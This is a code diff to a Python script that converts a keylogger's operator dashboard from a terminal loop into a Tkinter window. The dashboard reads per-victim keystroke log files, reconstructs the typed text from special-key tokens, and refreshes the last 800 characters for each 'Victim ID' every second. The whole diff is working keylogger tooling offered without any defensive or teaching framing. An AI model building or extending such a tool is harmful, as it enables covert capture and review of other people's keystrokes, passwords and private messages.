@@ -1,14 +1,11 @@
+import tkinter as tk
 from pathlib import Path
 import re
-import time
 
 LOG_DIR = Path("logs")
 TOKEN_PATTERN = re.compile(r"\[(BS|TAB|DEL|SHIFT|CAPS)\]")
 REFRESH_SECONDS = 1
 TAB_SIZE = 4
-
-def clear_screen():
-    print("\033[2J\033[H", end="") # Erase the entire screen, Move the cursor to top left of screen
 
 def apply_backspace(lines):
     if not lines:
@@ -79,6 +76,7 @@ def read_all_logs():
 
         clients.append({
             "victim id": log_file.stem, # .stem gets the filename
+            "filename": log_file.name,
             "size": log_file.stat().st_size, # Size of the file in bytes
             "parsed_text": parsed_text
         })
@@ -86,26 +84,69 @@ def read_all_logs():
     return clients
 
 
-def show_dashboard(clients):
-    clear_screen()
-    print("--------- KEYLOGGER DASHBOARD ---------")
-    print(f"Clients found: {len(clients)}")
-    print()
-
+def update_dashboard():
+    clients = read_all_logs()
+    
+    # Build the string of text to show on screen
+    display_text = f"Clients found: {len(clients)}\n\n"
+    
     for client in clients:
-        print("-" * 70)
-        print(f"Victim ID: {client['id']}")
-        print(f"File: {client['filename']} | Size: {client['size']} bytes")
-        print("-" * 70)
-        print(client["parsed_text"][-800:])
-        print()
+        display_text += "-" * 70 + "\n"
+        display_text += f"Victim ID: {client['victim id']}\n"
+        display_text += f"File: {client['filename']} | Size: {client['size']} bytes\n"
+        display_text += "-" * 70 + "\n"
+        display_text += client["parsed_text"][-800:] + "\n\n"
+        
+    # Unlock the text box, clean it, insert new text, lock it again
+    text_box.config(state=tk.NORMAL)
+    text_box.delete("1.0", tk.END)
+    text_box.insert(tk.END, display_text)
+    text_box.config(state=tk.DISABLED) # Read only
+    
+    # Tkinter - run function again in 1000 milliseconds (1 sec)
+    root.after(REFRESH_SECONDS * 1000, update_dashboard)
 
 
 def main():
-    while True:
-        clients = read_all_logs()
-        show_dashboard(clients)
-        time.sleep(REFRESH_SECONDS)
+    global root, text_box  # global so that update_dashboard() can access them
+    
+    # UI
+    root = tk.Tk()
+    root.title("Keylogger Dashboard")
+    root.geometry("800x600")
+    root.configure(bg="#1b2a6f")
+
+
+    # Top Title
+    title_label = tk.Label(
+        root, 
+        text="--------- KEYLOGGER DASHBOARD ---------", 
+        bg="#1b2a6f",
+        fg="#4ade80",
+        font=("Courier", 16, "bold")
+    )
+    title_label.pack(pady=15)
+
+
+    # Main Text Area
+    text_box = tk.Text(
+        root, 
+        bg="#0d1740", # background
+        fg="#4ade80", # text
+        bd=3, # boarder
+        relief=tk.SUNKEN, # make the boarder fancy
+        highlightthickness=0, # no highlight on text box
+        font=("Comfortaa", 11),
+        padx=10, 
+        pady=10
+    )
+    # Pack it so it expands to fill the window
+    text_box.pack(expand=True, fill=tk.BOTH, padx=20, pady=20)
+
+    update_dashboard()
+
+    # Start the graphics window
+    root.mainloop()
 
 
 if __name__ == "__main__":
